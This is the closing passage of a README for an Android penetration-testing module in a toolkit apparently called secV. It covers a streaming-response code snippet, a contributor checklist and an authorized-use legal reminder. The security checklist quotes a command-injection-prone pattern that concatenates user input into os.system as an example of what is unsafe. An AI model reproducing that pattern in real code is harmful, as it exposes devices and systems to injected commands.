- `self._send(code, content_type, bytes)` - send arbitrary response

**For streaming responses (SSE):**

```python
def _api_my_stream(self):
    self.send_response(200)
    self.send_header("Content-Type", "text/event-stream; charset=utf-8")
    self.send_header("Cache-Control", "no-cache")
    self._cors()
    self.end_headers()
    try:
        while True:
            data = get_next_chunk()  # your logic
            escaped = json.dumps(data)
            self.wfile.write(f"data: {escaped}\n\n".encode())
            self.wfile.flush()
    except (BrokenPipeError, ConnectionResetError):
        pass
```

---

## 43. Contribution Checklist

Before opening a pull request for this module:

**Code quality:**
- [ ] New operation added to `android_pentest.py` with proper error handling
- [ ] Operation registered in the dispatch dict in `_run()`
- [ ] No unhandled exceptions - all external calls wrapped in try/except
- [ ] No hardcoded paths - use `Path.home() / ".secv" / ...` for output directories
- [ ] New tool dependencies listed in `rqm.md` under `#python`, `#pacman`, and `#apt`

**Documentation:**
- [ ] Operation added to `module.json` - `options`, `examples`, and `features` arrays
- [ ] Parameter added to `module.json` `help.parameters` with description and type
- [ ] README.md (this file) updated with the new operation in the correct Part III section
- [ ] GUI operation entry added to the `OPS` object in `android_gui.py` with `cli` hint
- [ ] If a new group is added: `OPS_CATS` updated and color assigned in CSS

**Testing:**
- [ ] Tested with a physical device
- [ ] Tested with no device connected (operations that don't need a device)
- [ ] Tested with `--serve false` (JSON output mode)
- [ ] GUI operation runs and streams output correctly
- [ ] CLI `--help` or `info android_pentest` in secV shell shows the new operation

**Security:**
- [ ] No command injection - all user input to subprocesses goes through list-form arguments
  (`subprocess.run(["adb", "shell", user_input])` is safe; `os.system("adb shell " + user_input)` is NOT)
- [ ] File paths from user input are validated or restricted to the `~/.secv/` tree
- [ ] Authorization: every operation that touches a device requires explicit device selection
  (no silent "scan everything in range" without consent)

---

> **Legal reminder.** This module is for authorized testing only. You must own the device
> or have written permission to test it. Many operations here would be illegal if performed
> on a device you do not have authorization to test. Always follow responsible disclosure
> practices for any vulnerabilities you find.

---

*secV android\_pentest v2.4.3 "tauri" · last updated 2026-05-21 · maintained by 0xb0rn3*
